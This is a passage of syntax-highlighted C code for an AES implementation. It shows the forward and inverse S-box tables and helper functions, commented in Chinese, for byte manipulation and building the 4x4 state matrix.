class="hljs-number">0x22</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0xdb</span>,<br>                               <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x79</span>,<br>                               <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x08</span>,<br>                               <span class="hljs-number">0xba</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x8a</span>,<br>                               <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>,<br>                               <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>,<br>                               <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆S盒</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S2[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xfb</span>,<br>                                <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>,<br>                                <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x4e</span>,<br>                                <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x25</span>,<br>                                <span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x92</span>,<br>                                <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x84</span>,<br>                                <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br>                                <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x6b</span>,<br>                                <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x73</span>,<br>                                <span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x6e</span>,<br>                                <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x1b</span>,<br>                                <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xf4</span>,<br>                                <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>,<br>                                <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xef</span>,<br>                                <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br>                                <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x7d</span> &#125;;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S3[] = &#123; <span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xfb</span>,<br>                                <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>,<br>                                <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x4e</span>,<br>                                <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x25</span>,<br>                                <span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x92</span>,<br>                                <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x84</span>,<br>                                <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br>                                <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x6b</span>,<br>                                <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x73</span>,<br>                                <span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x6e</span>,<br>                                <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x1b</span>,<br>                                <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xf4</span>,<br>                                <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>,<br>                                <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xef</span>,<br>                                <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br>                                <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x7d</span> &#125;;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取整形数据的低8位的左4个位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getLeft4Bit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = num &amp; <span class="hljs-number">0x000000f0</span>;<br>    <span class="hljs-keyword">return</span> left &gt;&gt; <span class="hljs-number">4</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取整形数据的低8位的右4个位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getRight4Bit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> num &amp; <span class="hljs-number">0x0000000f</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 根据索引，从S盒中获得元素</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNumFromSBox</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> row = getLeft4Bit(index);<br>    <span class="hljs-keyword">int</span> col = getRight4Bit(index);<br>    <span class="hljs-keyword">return</span> S[row][col];<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把一个字符转变成整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getIntFromChar</span><span class="hljs-params">(<span class="hljs-keyword">char</span> c)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result = (<span class="hljs-keyword">int</span>) c;<br>    <span class="hljs-keyword">return</span> result &amp; <span class="hljs-number">0x000000ff</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把16个字符转变成4X4的数组，</span><br><span class="hljs-comment"> * 该矩阵中字节的排列顺序为从上到下，</span><br><span class="hljs-comment"> * 从左到右依次排列。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">convertToIntArray</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> pa[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> * pp = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *)str;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>            pa[j][i] = getIntFromChar(str[k]);<br>            k++;<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印4X4的数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>,  a[i][j]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印字符串的ASSCI，</span><br><span class="hljs-comment"> * 以十六进制显示。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printASSCI</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x &quot;</span>, getIntFromChar(str[i]));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把连续的4个字符合并成一个4字节的整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getWordFromStr</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one, two, three, four;<br>    one = getIntFromChar(str[<span class="hljs-number">0</span>]);<br>    one = one &lt;&lt; <span class="hljs-number">24</span>;<br>    two = getIntFromChar(str[<span class="hljs-number">1</span>]);<br>    two = two &lt;&lt; <span class="hljs-number">16</span>;<br>    three = getIntFromChar(str[<span class="hljs-number">2</span>]);<br>    three = three &lt;&lt; <span class="hljs-number">8</span>;<br>    four = getIntFromChar(str[<span class="hljs-number">3</span>]);<br>    <span class="hljs-keyword">return</span> one | two | three | four;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把一个4字节的数的第一、二、三、四个字节取出，</span><br><span class="hljs-comment"> * 入进一个4个元素的整型数组里面。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">splitIntToArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, <span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one, two, three;<br>    one = num &gt;&gt; <span class="hljs-number">24</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>] = one &amp; <span class="hljs-number">0x000000ff</span>;<br>    two = num &gt;&gt; <span class="hljs-number">16</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>] = two &amp; <span class="hljs-number">0x000000ff</span>;<br>    three = num &gt;&gt; <span class="hljs-number">8</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>] = three &amp; <span class="hljs-number">0x000000ff</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>] = num &amp; <span class="hljs-number">0x000000ff</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 将数组中的元素循环左移step位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span 